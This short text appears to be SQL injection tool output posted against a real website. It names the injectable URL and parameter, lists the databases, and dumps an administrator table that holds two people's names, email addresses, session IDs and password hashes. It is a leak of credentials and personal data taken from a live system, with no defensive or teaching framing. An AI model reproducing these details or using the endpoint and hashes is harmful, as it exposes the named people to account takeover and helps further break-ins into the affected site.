VULN URL : http://www.dev-pa.com/veri_getir.php?get_vize_types=true&ulke=1 - string ulke

available databases [3]:
[*] information_schema
[*] lthdevtp_data
[*] performance_schema

Database: lthdevtp_data
Table: yonetici
[2 entries]
+----+----------------------------------+---------------+------------+-------+--------+----------------------+----------------------------------+----------+
| id | sessid                           | ad            | sure       | aktif | soyad  | eposta               | parola                           | kulladi  |
+----+----------------------------------+---------------+------------+-------+--------+----------------------+----------------------------------+----------+
| 1  | 558cf0e7233027b255a16e29a22cd335 | Faruk         | 1728481502 | aktif | EREN   | erensoft@hotmail.com | d5731393ac8d24e50bb72b3996c43bca | erensoft |
| 2  | 698fa4af36aba4ed9a8de25612e84e95 | Seyit İbrahim | 1729003274 | aktif | DURMUŞ | info@argeontur.com   | d5731393ac8d24e50bb72b3996c43bca | ibrahim  |
+----+----------------------------------+---------------+------------+-------+--------+----------------------+----------------------------------+----------+
